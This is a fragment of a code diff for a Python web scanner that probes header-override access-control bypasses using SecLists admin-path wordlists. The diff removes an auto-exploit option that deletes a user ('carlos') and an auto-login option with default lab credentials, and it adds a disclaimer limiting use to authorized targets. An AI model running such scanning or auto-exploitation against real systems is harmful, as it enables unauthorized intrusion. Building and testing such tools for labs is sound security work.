-    p.add_argument("--insecure", action="store_true", help="Do not verify TLS")
-    p.add_argument("--follow", action="store_true", help="Follow redirect chains")
-    p.add_argument("--deep", action="store_true", help="Use SecLists optimized admin path discovery")
-    p.add_argument("--output", help="Save findings to JSON")
-    p.add_argument("--csv", help="Save findings to CSV")
-    p.add_argument("--rate-limit", type=float, default=0.0, help="Delay between requests (seconds)")
-    p.add_argument("--auto-exploit", action="store_true", help="Attempt automatic exploit (delete carlos) on HIGH findings")
-    p.add_argument("--auto-login", action="store_true", help="Attempt automatic login with default lab creds (wiener/peter) before testing")
+    p = argparse.ArgumentParser(description="X-Override single-file modular scanner (low false positives). Use only on authorized targets.")
+    p.add_argument("-u","--url", required=True, help="Target host or base url (example.com or https://example.com)")
+    p.add_argument("--deep", action="store_true", help="Enable SecLists deep mode (optimized filter)")
+    p.add_argument("--post-data", help="POST body to use (enable POST tests)")
+    p.add_argument("--cookie", help="Cookie header to include")
+    p.add_argument("--insecure", action="store_true", help="Disable TLS verification")
+    p.add_argument("--max", type=int, default=300, help="Max SecLists paths to load (optimized)")
+    p.add_argument("--timeout", type=int, default=8, help="Request timeout seconds")
     return p.parse_args()
 
 def main():
     args = parse_args()
-    try:
-        findings = asyncio.run(main_async(args))
-        print(f"{GREEN}[+] Scan complete. {len(findings)} finding(s).{RESET}")
-        if findings:
-            for f in findings:
-                sevcol = GREEN if f["severity"]=="LOW" else (YELLOW if f["severity"]=="MEDIUM" else RED)
-                print(f"{sevcol}[{f['severity']}] {f['header']} {f['method']} -> {f['override']} on {f['path_tested']}{RESET}")
-                for r in f['reasons']:
-                    print(f"   - {r}")
-    except KeyboardInterrupt:
-        print(f"{YELLOW}[!] Interrupted by user{RESET}")
-    except Exception as e:
-        print(f"{RED}[!] Fatal: {e}{RESET}")
+    # normalize
+    target = args.url
+    # create scanner
+    sc = Scanner(target, post_data=args.post_data, cookie=args.cookie, insecure=args.insecure, deep=args.deep, max_paths=args.max, timeout=args.timeout)
+    # set seclists dir to default or env override
+    if args.deep:
+        loader = sc.secloader
+        if os.path.isdir(SECLISTS_DIR_DEFAULT):
+            loader.base_dir = SECLISTS_DIR_DEFAULT
+        else:
+            # try common alternatives
+            alt = "/usr/share/wordlists/seclists/Discovery/Web-Content"
+            if os.path.isdir(alt):
+                loader.base_dir = alt
+    sc.run()
 
 if __name__ == "__main__":
     main()
